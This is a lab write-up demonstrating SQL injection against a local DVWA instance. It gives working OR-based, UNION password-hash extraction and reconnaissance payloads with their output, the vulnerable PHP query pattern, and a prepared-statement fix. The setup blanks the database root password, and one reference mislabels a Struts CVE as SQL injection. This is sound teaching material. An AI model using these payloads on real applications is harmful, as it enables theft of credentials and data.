# Task 3: SQL Injection on DVWA (Low Security)

## Objective

Demonstrate a classic SQL Injection vulnerability by exploiting the SQL Injection module of DVWA on its Low security setting, document the attack methodology, and explain how to prevent it.

---

## Background & Ethical Use

SQL Injection is one of the most critical and prevalent web application vulnerabilities, consistently appearing in the OWASP Top 10 list of security risks. It occurs when untrusted user input is incorporated into a database query without proper sanitization, allowing attackers to manipulate the query logic and interact with the database in unintended ways.

**Ethical Use Notice:** All SQL injection techniques demonstrated in this task were performed exclusively against DVWA running locally on the assessor's own machine. DVWA is a deliberately vulnerable application designed for security education. Never attempt SQL injection against any real website, application, or service without explicit written authorization. Unauthorized SQL injection is illegal under computer misuse laws in most jurisdictions.

---

## What is SQL Injection?

A web application typically takes user input and uses it to build a database query. For example, a login form might run:

```sql
SELECT * FROM users WHERE user_id = '1'
```

SQL injection happens when an attacker inserts SQL code into the input field instead of normal text. If the application does not sanitize the input, the database executes the injected code as part of the query.

For example, inputting `1' OR '1'='1` transforms the query into:

```sql
SELECT * FROM users WHERE user_id = '1' OR '1'='1'
```

Since `'1'='1'` is always true, the WHERE clause evaluates to true for every row, causing the database to return all records instead of just the intended one.

---

## Environment Setup

| Component | Detail |
|-----------|--------|
| Operating System | Kali Linux (VMware Fusion on macOS) |
| Web Server | Apache 2.4.63 |
| Database | MariaDB 11.4.5 |
| PHP Version | 8.4.4 |
| DVWA Version | Latest (cloned from GitHub) |
| DVWA Security Level | Low |
| Target URL | http://127.0.0.1/DVWA/vulnerabilities/sqli/ |

### Installation Steps

```bash
# Install required packages
sudo apt install php php-mysqli mariadb-server -y

# Clone DVWA into Apache web root
sudo git clone https://github.com/digininja/DVWA.git /var/www/html/DVWA

# Set file permissions
sudo chown -R www-data:www-data /var/www/html/DVWA
sudo chmod -R 755 /var/www/html/DVWA

# Start services
sudo systemctl start apache2
sudo systemctl start mariadb

# Configure database
sudo mysql -u root
```

Inside MySQL:
```sql
ALTER USER 'root'@'localhost' IDENTIFIED VIA mysql_native_password USING PASSWORD('');
FLUSH PRIVILEGES;
EXIT;
```

Access DVWA at `http://127.0.0.1/DVWA/setup.php` and click Create / Reset Database.

Default login credentials: admin / password

---

## Methodology

### Step 1: Normal Behavior

Input `1` into the User ID field. The application returns the expected result for user ID 1:
ID: 1
First name: admin
Surname: admin

This confirms the application is querying the database using the input value directly.

### Step 2: Payload 1 - Basic OR Injection

**Payload:** `1' OR '1'='1`

**Result:** All 5 users returned from the database:
First name: admin, Surname: admin
First name: Gordon, Surname: Brown
First name: Hack, Surname: Me
First name: Pablo, Surname: Picasso
First name: Bob, Surname: Smith

**Why it works:** The single quote closes the original string, OR introduces an alternative condition, and '1'='1' is always true. The database returns every row in the table.

See screenshot: `sqli1_basic_injection.png`

### Step 3: Payload 2 - UNION-Based Password Hash Extraction

**Payload:** `1' UNION SELECT user, password FROM users#`

**Result:** All usernames and MD5 password hashes extracted:
admin : 5f4dcc3b5aa765d61d8327deb882cf99
gordonb : e99a18c428cb38d5f260853678922e03
1337 : 8d3533d75ae2c3966d7e0d4fcc69216b
pablo : 0d107d09f5bbe40cade3de5c71e9e9b7
smithy : 5f4dcc3b5aa765d61d8327deb882cf99

**Why it works:** UNION SELECT appends a second query to the original, selecting from the users table directly. The # symbol comments out the rest of the original query, preventing syntax errors.

**Notable finding:** The hash `5f4dcc3b5aa765d61d8327deb882cf99` is the MD5 hash of the word "password", confirming that weak password hashing combined with SQL injection leads to full credential compromise.

See screenshot: `sqli2_union_injection.png`

### Step 4: Payload 3 - Database Reconnaissance

**Payload:** `1' UNION SELECT version(), database()#`

**Result:**
First name: 11.4.5-MariaDB-1
Surname: dvwa

**Why it works:** MySQL built-in functions `version()` and `database()` return server metadata. Attackers use this to identify the database version and name for further targeted attacks.

See screenshot: `sqli3_version_injection.png`

---

## Findings Summary

| Payload | Technique | Data Exposed | Severity |
|---------|-----------|--------------|----------|
| `1' OR '1'='1` | Boolean-based injection | All user records | High |
| `1' UNION SELECT user, password FROM users#` | UNION-based injection | Usernames and password hashes | Critical |
| `1' UNION SELECT version(), database()#` | UNION-based reconnaissance | Database version and name | Medium |

---

## Root Cause Analysis

The vulnerability exists because user input is directly concatenated into the SQL query without sanitization. The vulnerable PHP code pattern is:

```php
$query = "SELECT * FROM users WHERE user_id = '$id'";
$result = mysqli_query($conn, $query);
```

When an attacker inputs `1' OR '1'='1`, the variable `$id` contains the malicious payload and the final query becomes:

```sql
SELECT * FROM users WHERE user_id = '1' OR '1'='1'
```

The database has no way to distinguish between the intended SQL structure and the injected code because they are concatenated as a single string.

---

## How to Fix SQL Injection

The solution is to use parameterized queries (prepared statements), which separate SQL code from user-supplied data:

```php
$stmt = $pdo->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
$stmt->execute([$id]);
$result = $stmt->fetchAll();
```

With parameterized queries, the SQL structure is defined first and user input is passed separately as a parameter. The database driver ensures that input is always treated as a literal value, never as executable SQL code. Even if an attacker inputs `1' OR '1'='1`, it is treated as a string literal and the injection fails.

Additional defenses:
- **Input validation:** Reject input that does not match the expected format (e.g., only allow numeric values for a user ID field)
- **Least privilege:** The database user used by the application should only have SELECT permission on the tables it needs, not full access
- **Web Application Firewall (WAF):** Deploy a WAF to detect and block common SQL injection patterns at the network level

---

## Key Learnings

- SQL injection is caused by trusting user input and incorporating it directly into database queries without sanitization.
- Even a simple OR injection can expose an entire database table. More advanced UNION-based injections can extract data from any table the database user has access to.
- Password hashes extracted via SQL injection can be cracked offline using rainbow tables or brute force, especially when weak algorithms like MD5 are used.
- Parameterized queries are the definitive fix for SQL injection. Input validation and WAFs provide additional layers of defense but should not replace parameterized queries.

---

## References

- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- PortSwigger Web Security Academy — SQL Injection: https://portswigger.net/web-security/sql-injection
- OWASP SQL Injection Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- DVWA GitHub Repository: https://github.com/digininja/DVWA
- MITRE ATT&CK — Exploit Public Facing Application: https://attack.mitre.org/techniques/T1190/
- NIST — SQL Injection: https://nvd.nist.gov/vuln/detail/CVE-2017-5638
